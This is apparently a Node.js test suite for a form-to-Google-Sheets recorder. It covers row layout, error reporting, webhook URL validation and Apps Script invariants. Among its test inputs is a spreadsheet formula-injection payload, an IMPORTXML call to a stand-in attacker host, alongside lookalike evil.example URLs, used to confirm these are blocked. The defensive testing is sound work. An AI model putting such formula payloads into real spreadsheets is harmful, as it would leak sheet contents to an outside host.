import { test } from 'node:test';
import assert from 'node:assert/strict';
import { resolveSheet, sheetRecorder, rowFor, headerFor, sheetFor, COLUMNS, HEADER_ROW } from '../lib/nomination-sheet.mjs';
import { FORM_KINDS } from '../lib/form-schema.mjs';

const ENV = {
  IFF_SHEET_WEBHOOK_URL: 'https://script.google.com/macros/s/AKfy_fake/exec',
  IFF_SHEET_SECRET: 'a-long-random-string'
};

const FIELDS = {
  nominatorFirstName: 'Ada', nominatorLastName: 'Byron', nominatorEmail: 'ada@example.com',
  nomineeFirstName: 'Grace', nomineeLastName: 'Hopper', nomineeEmail: 'grace@example.com',
  category: 'Leaders', nomineeTitle: 'Rear Admiral', nomineeCompany: 'US Navy',
  linkedin: 'linkedin.com/in/grace', oneLine: 'The woman who taught computers English.',
  impact: 'Built the first compiler.', supportsWomen: 'Mentored a generation.',
  subscribe: 'Yes'
};

/* Stands in for the deployed Apps Script. `answer` is the JSON body it
   returns, which is where every outcome lives -- ContentService always sends
   200, so the body is the only signal. `html` makes it answer a sign-in page
   instead, the way Google does when a deployment is not open to Anyone. */
function script({ answer = { ok: true, row: 2 }, status = 200, html = false } = {}) {
  const calls = [];
  const impl = async (url, options = {}) => {
    if (options.signal && options.signal.aborted) {
      throw Object.assign(new Error('aborted'), { name: 'AbortError' });
    }
    calls.push({
      url: String(url),
      headers: options.headers || {},
      redirect: options.redirect,
      body: options.body ? JSON.parse(options.body) : null
    });
    return {
      ok: status < 400,
      status,
      json: async () => {
        if (html) throw new SyntaxError('Unexpected token < in JSON');
        return answer;
      },
      text: async () => ''
    };
  };
  impl.calls = calls;
  return impl;
}

test('the header and the row are one declaration, so they cannot drift', () => {
  assert.equal(HEADER_ROW.length, COLUMNS.length);
  assert.equal(rowFor(FIELDS, 'now').length, HEADER_ROW.length);
});

test('a row lands in the documented column order', () => {
  const row = rowFor(FIELDS, '2026-10-18T12:00:00.000Z');
  assert.equal(row[HEADER_ROW.indexOf('Submitted')], '2026-10-18T12:00:00.000Z');
  assert.equal(row[HEADER_ROW.indexOf('Nominator Email')], 'ada@example.com');
  assert.equal(row[HEADER_ROW.indexOf('Nominee First Name')], 'Grace');
  assert.equal(row[HEADER_ROW.indexOf('Category')], 'Leaders');
  assert.equal(row[HEADER_ROW.indexOf('How is the Nominee supportive of women')], 'Mentored a generation.');
});

/* An undefined cell becomes null through JSON, which the script would write
   as the text "null". */
test('a missing optional answer becomes an empty cell, not null', () => {
  const { nomineeEmail, linkedin, nomineeTitle, ...sparse } = FIELDS;
  const row = rowFor(sparse, 'now');
  assert.equal(row.length, HEADER_ROW.length);
  assert.equal(row[HEADER_ROW.indexOf('Nominee Email')], '');
  assert.ok(row.every((cell) => typeof cell === 'string'));
});

test('the secret, the header and the row are all sent', async () => {
  const f = script();
  const result = await sheetRecorder(ENV, f).append(FIELDS, '2026-10-18T12:00:00.000Z');
  assert.equal(f.calls.length, 1);

  const { url, body, headers, redirect } = f.calls[0];
  assert.equal(url, ENV.IFF_SHEET_WEBHOOK_URL);
  assert.equal(body.secret, ENV.IFF_SHEET_SECRET);
  assert.deepEqual(body.header, HEADER_ROW, 'the header travels with every write');
  assert.equal(body.row.length, HEADER_ROW.length);
  assert.equal(result.row, 2);

  /* Anything but text/plain makes this a CORS preflight, which Apps Script
     answers in a way that drops the body. */
  assert.match(headers['content-type'], /^text\/plain/);
  /* Apps Script 302s to googleusercontent.com, which carries the real body. */
  assert.equal(redirect, 'follow');
});

/* ContentService always answers 200, so a caller that trusted the status
   would read every failure as a success and lose rows in silence. */
test('a failure in the body is a failure, despite the 200', async () => {
  const cases = {
    forbidden: 'auth',
    header_mismatch: 'header',
    no_such_tab: 'not_found',
    busy: 'busy',
    bad_json: 'upstream',
    post_only: 'config'
  };
  for (const [error, code] of Object.entries(cases)) {
    const f = script({ answer: { ok: false, error } });
    await assert.rejects(() => sheetRecorder(ENV, f).append(FIELDS), (e) => e.code === code, error);
  }
});

test('an unrecognised refusal is still a refusal', async () => {
  const f = script({ answer: { ok: false, error: 'something_new' } });
  await assert.rejects(() => sheetRecorder(ENV, f).append(FIELDS), (e) => e.code === 'upstream');
});

test('a body without ok:true is never treated as written', async () => {
  for (const answer of [{}, { ok: 'yes' }, { ok: 1 }, null]) {
    const f = script({ answer });
    await assert.rejects(() => sheetRecorder(ENV, f).append(FIELDS));
  }
});

/* Google serves an HTML sign-in page when the deployment is not open to
   Anyone: a 200 that is not JSON, and the likeliest setup mistake after the
   secret itself. */
test('a sign-in page is reported as a deployment problem, not a data one', async () => {
  const f = script({ html: true });
  await assert.rejects(
    () => sheetRecorder(ENV, f).append(FIELDS),
    (e) => e.code === 'config' && /Anyone/.test(e.message)
  );
});

test('a non-2xx is reported as the deployment, not the row', async () => {
  const f = script({ status: 404 });
  await assert.rejects(() => sheetRecorder(ENV, f).append(FIELDS), (e) => e.code === 'upstream');
});

test('a slow script times out rather than holding the request open', async () => {
  await assert.rejects(
    () => sheetRecorder(ENV, script()).append(FIELDS, 'now', AbortSignal.abort()),
    (e) => e.code === 'timeout'
  );
});

test('resolveSheet needs both the URL and the secret', () => {
  assert.ok(resolveSheet('nomination', ENV));
  assert.equal(resolveSheet('nomination', { IFF_SHEET_WEBHOOK_URL: ENV.IFF_SHEET_WEBHOOK_URL }), null);
  assert.equal(resolveSheet('nomination', { IFF_SHEET_SECRET: ENV.IFF_SHEET_SECRET }), null);
  assert.equal(resolveSheet('nomination', {}), null);
});

/* Adding a form to the site must not quietly start writing into a spreadsheet:
   a kind earns a tab by being listed, never by existing. co-founder is the
   live proof -- it is a real form on the site and it records nothing. */
test('only the kinds with a tab are recorded', () => {
  for (const kind of ['co-founder', 'whatever', '', null, undefined, 'Nomination', ' ']) {
    assert.equal(resolveSheet(kind, ENV), null, String(kind));
  }
});

test('nominations and membership each record to their own tab', () => {
  assert.equal(resolveSheet('nomination', ENV).tab, 'IFF Nominations List');
  assert.equal(resolveSheet('membership', ENV).tab, 'Membership Signups');
});

/* The two tabs must not share a header. They are written by position, so if
   these ever matched, the script's header guard -- the thing that catches a
   row landing in the wrong tab -- would pass on a misrouted write. */
test('the two tabs have different headers', () => {
  assert.notDeepEqual(headerFor('nomination'), headerFor('membership'));
  assert.equal(headerFor('co-founder'), null);
});

test('a membership row carries every answer, in header order', () => {
  const header = headerFor('membership');
  const row = rowFor({
    firstName: 'Ada', lastName: 'Lovelace', email: 'ada@example.com',
    jobTitle: 'Engineer', company: 'Analytical Engines',
    support: ['Networking Opportunities', 'Job Search'],
    testimonial: 'The best room in fintech.', subscribe: 'Yes'
  }, '2026-10-30T12:00:00.000Z', 'membership');

  assert.equal(row.length, header.length);
  assert.equal(row[header.indexOf('Submitted')], '2026-10-30T12:00:00.000Z');
  assert.equal(row[header.indexOf('First Name')], 'Ada');
  assert.equal(row[header.indexOf('Email')], 'ada@example.com');
  assert.equal(row[header.indexOf('Testimonial')], 'The best room in fintech.');
  /* Joined, not stringified: String(['a','b']) loses the space after the
     comma, and the panel reads this column. */
  assert.equal(row[header.indexOf('How We Can Support Them')], 'Networking Opportunities, Job Search');
  /* An unanswered optional question is empty, never the text "undefined". */
  assert.equal(row[header.indexOf('Comments')], '');
});

/* The membership form posts more fields than any other, and a field the schema
   accepts but this file forgot would be dropped silently -- the row would be
   the right length, the header would match, and the answer would simply never
   appear. */
test('every membership field the form accepts reaches the sheet', () => {
  const recorded = new Set(headerFor('membership'));
  const missing = FORM_KINDS.membership.fields
    .map((f) => f.key)
    .filter((key) => {
      const row = rowFor({ [key]: 'SENTINEL-VALUE' }, 'now', 'membership');
      return !row.includes('SENTINEL-VALUE');
    });
  assert.deepEqual(missing, [], `these answers would be lost: ${missing.join(', ')}`);
  assert.ok(recorded.has('Submitted'));
});

test('an unknown kind is refused rather than written somewhere', () => {
  assert.throws(() => rowFor({}, 'now', 'co-founder'), /No sheet is configured/);
  assert.throws(() => sheetRecorder(ENV, async () => {}, 'co-founder'), /No sheet is configured/);
});

/* ──────────── what review found ──────────── */

/* The URL and the secret are the only two things between a stranger and the
   spreadsheet. Neither may reach a log the whole team reads. A raw undici
   error quotes the URL it failed to parse, so the rethrow has to be wrapped
   — the earlier version of this test only covered the body-refusal branches
   and so asserted a property the code did not have. */
test('a transport failure cannot put the URL or the secret in a log line', async () => {
  const boom = async () => { throw new TypeError(`Failed to parse URL from ${ENV.IFF_SHEET_WEBHOOK_URL}`); };
  await assert.rejects(
    () => sheetRecorder(ENV, boom).append(FIELDS),
    (error) =>
      error.code === 'network' &&
      !error.message.includes(ENV.IFF_SHEET_WEBHOOK_URL) &&
      !error.message.includes(ENV.IFF_SHEET_SECRET) &&
      error.cause instanceof TypeError
  );
});

/* The secret is about to be posted to this URL, so check where it is going. */
test('the secret is never posted anywhere but https script.google.com', async () => {
  const bad = [
    'http://script.google.com/macros/s/AK/exec',
    'https://evil.example/macros/s/AK/exec',
    'https://script.google.com.evil.example/exec',
    'not a url'
  ];
  for (const IFF_SHEET_WEBHOOK_URL of bad) {
    const f = script();
    await assert.rejects(
      () => sheetRecorder({ ...ENV, IFF_SHEET_WEBHOOK_URL }, f).append(FIELDS),
      (e) => e.code === 'config',
      IFF_SHEET_WEBHOOK_URL
    );
    assert.equal(f.calls.length, 0, `nothing may be sent to ${IFF_SHEET_WEBHOOK_URL}`);
  }
});

/* A deployment made before the secret was set would be writable by anyone who
   read the placeholder in this repository. The script refuses; the site has
   to say so in terms an operator can act on. */
test('a script still holding its placeholder secret is reported as config', async () => {
  const f = script({ answer: { ok: false, error: 'misconfigured' } });
  await assert.rejects(
    () => sheetRecorder(ENV, f).append(FIELDS),
    (e) => e.code === 'config' && /SECRET/.test(e.message)
  );
});

/* The script says more than which case it hit. Dropping that leaves an
   operator with a category and nothing to act on. */
test("the script's own diagnostics survive into the error", async () => {
  const thrown = script({ answer: { ok: false, error: 'script_error', message: 'Those rows are out of bounds.' } });
  await assert.rejects(
    () => sheetRecorder(ENV, thrown).append(FIELDS),
    (e) => e.code === 'upstream' && /out of bounds/.test(e.message)
  );

  const drifted = script({
    answer: { ok: false, error: 'header_mismatch', column: 3, expected: 'Nominator Last Name', found: 'Surname' }
  });
  await assert.rejects(
    () => sheetRecorder(ENV, drifted).append(FIELDS),
    (e) => e.code === 'header' && /column 3/.test(e.message) && /Surname/.test(e.message)
  );
});

/* The caller's budget must outlast the script's own lock wait, or a row could
   be written just after the caller gave up — and an operator reading the
   failure log would re-enter a nomination that is already there. */
test('the budget leaves room for the script to wait for its lock', async () => {
  const source = await import('node:fs').then((fs) =>
    fs.readFileSync(new URL('../lib/nomination-sheet.mjs', import.meta.url), 'utf8'));
  const budget = Number(/const BUDGET_MS = (\d+)/.exec(source)[1]);

  const gs = await import('node:fs').then((fs) =>
    fs.readFileSync(new URL('../docs/iff-nominations.gs', import.meta.url), 'utf8'));
  const lockWait = Number(/const LOCK_WAIT_MS = (\d+)/.exec(gs)[1]);

  assert.ok(budget > lockWait * 2,
    `BUDGET_MS (${budget}) must comfortably exceed LOCK_WAIT_MS (${lockWait})`);
});

/* ──────────── the Apps Script's own invariants ────────────
   docs/iff-nominations.gs runs in Google's runtime, not Node, so it cannot be
   executed here. These assert the properties a review found it getting wrong,
   so a later edit that reintroduces one fails the build rather than quietly
   reopening a hole in a public endpoint. */

const GS = await import('node:fs').then((fs) =>
  fs.readFileSync(new URL('../docs/iff-nominations.gs', import.meta.url), 'utf8'));

/* setValues treats a leading "=" as a FORMULA. Nominee text is written by the
   public, so a bio of =IMPORTXML(...) would exfiltrate the panel's sheet the
   moment a judge opened the tab. Setting the format to text must come FIRST. */
/* The earlier version of this test matched source text and passed throughout
   the period the guard did not work at all. It asserted setNumberFormat came
   before setValues, which is true and irrelevant: the format governs the
   spreadsheet UI, not setValues, which parses a leading "=" whatever the cell
   format is. Confirmed twice against the live sheet on 2026-10-19.

   So this lifts asText out of the script and RUNS it. That covers our own
   logic -- which strings get the marker -- which is the part we control. What
   it still cannot cover is Sheets consuming the apostrophe on write; only a
   real nomination shows that, and one was used to confirm it. */
test('a value that would be read as a formula is marked as text', () => {
  const source = /function asText\(value\)[\s\S]*?\n}/.exec(GS);
  assert.ok(source, 'asText must exist');
  const asText = new Function('return ' + source[0] + '; ')();

  for (const hostile of ['=1+1', '=IMPORTXML("https://evil.example","//a")', '+1+1', '-1+1', '@SUM(A1)']) {
    assert.equal(asText(hostile), "'" + hostile, `${hostile} was left to be parsed`);
  }
  for (const ordinary of ['She built the first compiler.', 'Director, Payments', '', 'a=b', '1+1']) {
    assert.equal(asText(ordinary), ordinary, `${ordinary} was needlessly altered`);
  }
  assert.equal(asText(undefined), 'undefined');
});

test('every cell is written through asText, and no row bypasses it', () => {
  const write = /function writeTextRow[\s\S]*?\n}/.exec(GS);
  assert.ok(write, 'writeTextRow must exist');
  assert.match(write[0], /values\.map\(asText\)/, 'the row must be mapped through asText');
  assert.ok(!/values\.map\(String\)/.test(write[0]), 'the unguarded String map must be gone');
  assert.ok(!/appendRow/.test(GS), 'appendRow bypasses the guard entirely');
});
/* An empty SECRET makes the length check 0 === 0 and the compare loop run zero
   times, so every request authenticates -- including one carrying no secret.
   The guard must run before anything else in doPost. */
test('the script refuses to run until its secret is set', () => {
  assert.match(GS, /function configured\(\)/);
  assert.match(GS, /SECRET\.length >= 32/, 'an empty or short secret must fail closed');
  assert.match(GS, /indexOf\('PASTE_'\) !== 0/, 'the published placeholder must fail closed');

  const doPost = GS.slice(GS.indexOf('function doPost'));
  assert.ok(
    doPost.indexOf('configured()') < doPost.indexOf('secretMatches'),
    'the configuration check must come before the secret comparison'
  );
});

/* Writes are buffered and committed at script end. Releasing the lock before
   flushing lets the next request read a stale last row, so one of two
   simultaneous nominations is overwritten -- with both callers told they
   succeeded. */
test('the row is flushed while the lock is still held', () => {
  assert.match(GS, /SpreadsheetApp\.flush\(\)/);
  assert.ok(
    GS.indexOf('SpreadsheetApp.flush()') < GS.indexOf('lock.releaseLock()'),
    'the flush must happen before the lock is released'
  );
});

/* getRange throws past the grid's edge rather than growing it, so a tab
   trimmed to 100 rows, or narrower than the header, fails at an arbitrary
   nomination -- or at the very first one. */
test('the grid is grown before it is written to', () => {
  assert.match(GS, /function ensureRoom/);
  assert.match(GS, /insertRowsAfter/);
  assert.match(GS, /insertColumnsAfter/);
});

/* A stack can quote the source of that file, and that file holds the secret. */
test('the script never returns a stack trace', () => {
  assert.ok(!/error\.stack/.test(GS.replace(/\/\*[\s\S]*?\*\//g, '')));
});

/* getActive() returns null in a standalone project, and a script BOUND to a
   spreadsheet can only be deployed by that spreadsheet's owner — so a sheet
   shared with you cannot carry its own script. Addressing the sheet by id
   works either way, and must not regress to the bound-only form. */
test('the script addresses the spreadsheet by id, not by context', () => {
  assert.ok(!/getActive\(\)/.test(GS.replace(/\/\*[\s\S]*?\*\//g, '')),
    'getActive() would break a standalone project');
  assert.match(GS, /SpreadsheetApp\.openById\(SHEET_ID\)/);
  assert.match(GS, /const SHEET_ID = '[A-Za-z0-9_-]{20,}'/, 'the id must be filled in');
});

/* A spreadsheet the running account cannot open is a different problem from a
   missing tab, and has a different fix. */
test('no access to the spreadsheet is reported as config, not a missing tab', async () => {
  const f = script({ answer: { ok: false, error: 'no_access' } });
  await assert.rejects(
    () => sheetRecorder(ENV, f).append(FIELDS),
    (e) => e.code === 'config' && /edit access/.test(e.message)
  );
});

/* ──────────── the script and the site must agree about tabs ──────────── */

/* docs/iff-nominations.gs allowlists the tabs it will write. The site names a
   tab in every request. If those two lists drift -- a tab added here and not
   there -- every write of that kind fails with tab_not_allowed, and because
   this path is swallowed by design the submitter still sees success. That is
   the silent-loss shape this whole file exists to prevent, so it is asserted
   rather than remembered.

   The script is read as text because it runs in Google's runtime, not Node;
   the array literal is evaluated so a reordering or a comment cannot break the
   comparison the way matching source text would. */
test('every tab the site writes is one the script allows', () => {
  const source = /const TABS = (\[[\s\S]*?\]);/.exec(GS);
  assert.ok(source, 'TABS is no longer a plain array literal in the script');
  const allowed = new Set(JSON.parse(source[1].replace(/'/g, '"')));

  for (const kind of ['nomination', 'membership']) {
    const tab = resolveSheet(kind, ENV).tab;
    assert.ok(allowed.has(tab), `the script would refuse ${kind} writes to ${JSON.stringify(tab)}`);
  }
});

/* The fallback exists so a request sent before membership existed still lands.
   If it ever pointed at the membership tab, those old-shaped requests would be
   written into the wrong one -- caught by the header guard, but only there. */
test('the script falls back to the nominations tab, not the membership one', () => {
  const fallback = /const DEFAULT_TAB = '([^']+)';/.exec(GS);
  assert.ok(fallback, 'DEFAULT_TAB is no longer a plain string in the script');
  assert.equal(fallback[1], resolveSheet('nomination', ENV).tab);
});

test('a membership write names the membership tab in the request', async () => {
  let sent = null;
  const capture = async (url, options) => {
    sent = JSON.parse(options.body);
    return new Response(JSON.stringify({ ok: true, row: 2 }), { status: 200 });
  };
  await sheetRecorder(ENV, capture, 'membership')
    .append({ firstName: 'Ada', lastName: 'Lovelace', email: 'ada@example.com' }, 'now');

  assert.equal(sent.tab, 'Membership Signups');
  assert.deepEqual(sent.header, headerFor('membership'));
  assert.equal(sent.row.length, sent.header.length);
  /* The secret still travels, and still is not the tab's problem. */
  assert.equal(sent.secret, ENV.IFF_SHEET_SECRET);
});

test('a nomination write still names the nominations tab', async () => {
  let sent = null;
  const capture = async (url, options) => {
    sent = JSON.parse(options.body);
    return new Response(JSON.stringify({ ok: true, row: 2 }), { status: 200 });
  };
  await sheetRecorder(ENV, capture).append(FIELDS, 'now');
  assert.equal(sent.tab, 'IFF Nominations List');
  assert.deepEqual(sent.header, HEADER_ROW);
});

/* A deployment that predates this change ignores `tab` and writes the
   nominations tab. Its header guard then rejects the membership header, so the
   caller is told the columns disagree rather than finding membership rows in
   the panel's tab. This asserts the caller surfaces that as a CONFIG problem
   an operator can act on. */
test('an un-redeployed script reports a header mismatch an operator can act on', async () => {
  const stale = async () => new Response(JSON.stringify({
    ok: false, error: 'header_mismatch', tab: 'IFF Nominations List',
    column: 2, expected: 'First Name', found: 'Nominator First Name'
  }), { status: 200 });

  await assert.rejects(
    () => sheetRecorder(ENV, stale, 'membership').append({ firstName: 'Ada' }, 'now'),
    (error) => {
      assert.equal(error.code, 'header');
      assert.match(error.message, /IFF Nominations List/);
      assert.match(error.message, /column 2/);
      return true;
    }
  );
});

/* SHEETS is a plain object, so an inherited property name must not read as a
   configured sheet. Before this was guarded, resolveSheet('toString') threw a
   TypeError with no `code` -- which api/form.js logs as "an error from outside
   that set", leaving an operator nothing to act on. It has to return null. */
test('an inherited property name is not a form kind', () => {
  for (const kind of ['constructor', 'toString', 'valueOf', 'hasOwnProperty', '__proto__', 'prototype']) {
    assert.equal(sheetFor(kind), null, kind);
    assert.equal(resolveSheet(kind, ENV), null, kind);
    assert.throws(() => rowFor({}, 'now', kind), /No sheet is configured/, kind);
  }
});
